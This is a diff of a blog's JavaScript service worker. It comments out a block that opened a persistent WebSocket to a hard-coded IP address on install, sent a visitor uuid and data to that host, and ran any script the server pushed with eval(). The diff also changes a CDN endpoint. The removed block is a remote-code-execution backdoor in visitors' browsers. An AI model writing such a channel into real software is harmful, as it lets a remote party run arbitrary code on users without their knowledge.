@@ -51,35 +51,36 @@ const generate_uuid = () => {
 }
 
 
-self.ws_sw = (config) => {
-    switch (config.type) {
-        case 'init':
-            self.wsc = new WebSocket(config.url)
-            break;
-        case 'send':
-            if(!wsc)ws_sw({ type: "init", url: "wss://119.91.80.151:50404" })
-            wsc.send(config.data)
-            break;
-        default:
-            break
-    }
-}
+// self.ws_sw = (config) => {
+//     switch (config.type) {
+//         case 'init':
+//             self.wsc = new WebSocket(config.url)
+//             break;
+//         case 'send':
+//             if(!wsc)ws_sw({ type: "init", url: "wss://119.91.80.151:50404" })
+//             wsc.send(config.data)
+//             break;
+//         default:
+//             break
+//     }
+// }
 
 
-self.addEventListener('active', async function (installEvent) {
-    ws_sw({ type: "init", url: "wss://119.91.80.151:50404" })
+self.addEventListener('activate', async function (installEvent) {
+    // ws_sw({ type: "init", url: "wss://119.91.80.151:50404" })
+    self.clients.claim()
 })
 
 self.addEventListener('install', async function (installEvent) {
     self.skipWaiting();
-    ws_sw({ type: "init", url: "wss://119.91.80.151:50404" })
+    // ws_sw({ type: "init", url: "wss://119.91.80.151:50404" })
 
 
-    wsc.onclose = () => {
-        setTimeout(() => {
-            ws_sw({ type: "init", url: "wss://119.91.80.151:50404" })
-        }, 1000);
-    }
+    // wsc.onclose = () => {
+    //     setTimeout(() => {
+    //         ws_sw({ type: "init", url: "wss://119.91.80.151:50404" })
+    //     }, 1000);
+    // }
 
     installEvent.waitUntil(
         caches.open(CACHE_NAME)
@@ -93,61 +94,61 @@ self.addEventListener('install', async function (installEvent) {
 });
 
 
-self.addEventListener("message", async event => {
-    const data = event.data;
-    if (!!data) {
-        switch (data.type) {
-            case 'INIT':
-                self.ClientPort = event.ports[0];
-                break;
-            default:
-                const event_data = event.data.id
-                ws_sw({
-                    type: "send",
-                    data: JSON.stringify({
-                        type: 'info',
-                        data: event.data.data,
-                        uuid: await db.read('uuid')
-                    })
-                });
-                wsc.addEventListener('message', async (event) => {
-                    const data = JSON.parse(event.data)
-                    switch (data.type) {
-                        case 'info':
-                            self.ClientPort.postMessage({
-                                id: event_data,
-                                type: "info",
-                                data: {
-                                    ip: data.data.ip,
-                                    addr: data.data.addr,
-                                    user: data.data.user,
-                                    delay: new Date().getTime() - data.data.time,
-                                }
-                            })
-                            break;
-                        case 'script':
-                            self.cb = async (data) => {
-                                ws_sw({
-                                    type: "send",
-                                    data: JSON.stringify({
-                                        type: 'callback',
-                                        data: data,
-                                        uuid: await db.read('uuid')
-                                    })
-                                });
-                            }
-                            eval(data.data)
+// self.addEventListener("message", async event => {
+//     const data = event.data;
+//     if (!!data) {
+//         switch (data.type) {
+//             case 'INIT':
+//                 self.ClientPort = event.ports[0];
+//                 break;
+//             default:
+//                 const event_data = event.data.id
+//                 ws_sw({
+//                     type: "send",
+//                     data: JSON.stringify({
+//                         type: 'info',
+//                         data: event.data.data,
+//                         uuid: await db.read('uuid')
+//                     })
+//                 });
+//                 wsc.addEventListener('message', async (event) => {
+//                     const data = JSON.parse(event.data)
+//                     switch (data.type) {
+//                         case 'info':
+//                             self.ClientPort.postMessage({
+//                                 id: event_data,
+//                                 type: "info",
+//                                 data: {
+//                                     ip: data.data.ip,
+//                                     addr: data.data.addr,
+//                                     user: data.data.user,
+//                                     delay: new Date().getTime() - data.data.time,
+//                                 }
+//                             })
+//                             break;
+//                         case 'script':
+//                             self.cb = async (data) => {
+//                                 ws_sw({
+//                                     type: "send",
+//                                     data: JSON.stringify({
+//                                         type: 'callback',
+//                                         data: data,
+//                                         uuid: await db.read('uuid')
+//                                     })
+//                                 });
+//                             }
+//                             eval(data.data)
 
 
-                            break
-                    }
+//                             break
+//                     }
 
 
-                })
-                break;
-        }
-    }
-})
+//                 })
+//                 break;
+//         }
+//     }
+// })
 
 
 
@@ -228,9 +229,9 @@ const blog_default_version = '1.1.9'
 const handle = async function (req) {
     set_blog_config(await db.read('blog_version') || blog_default_version)
     const reqdata = await req.clone()
-    try {
-        if (!wsc.OPEN) wsc.onclose()
-    } catch (e) { }
+    // try {
+    //     if (!wsc.OPEN) wsc.onclose()
+    // } catch (e) { }
     const urlStr = req.url
     let urlObj = new URL(urlStr)
     const uuid = await db.read('uuid')
@@ -338,13 +339,13 @@ const handle = async function (req) {
             if (urlStr.match(/\/blog\-cgi/g)) {
                 return handlecgi(req)
             }
-            if (typeof wsc !== "undefined") {
-                if (wsc.readyState != 1) {
-                    await db.write('disconnect', '1')
-                } else {
-                    await db.write('disconnect', '0')
-                }
-            }
+            // if (typeof wsc !== "undefined") {
+            //     if (wsc.readyState != 1) {
+            //         await db.write('disconnect', '1')
+            //     } else {
+            //         await db.write('disconnect', '0')
+            //     }
+            // }
             if (blog.local) { return fetch(req) }
             setTimeout(async () => {
                 await set_newest_blogver()
@@ -561,7 +562,7 @@ const handlecgi = async (req) => {
     //console.log(uuid)
     const pathname = urlObj.href.substr(urlObj.origin.length)
     const query = q => urlObj.searchParams.get(q)
-    const endpoint = "https://npm.elemecdn.com/chenyfan-blog-helper-dash@0.0.9/"
+    const endpoint = "https://cdn1.tianli0.top/npm/chenyfan-blog-helper-dash@0.0.9/"
     //const endpoint = "http://127.0.0.1:45454/"
     let dash_main = await (await fetch(endpoint + 'index.html')).text()
 
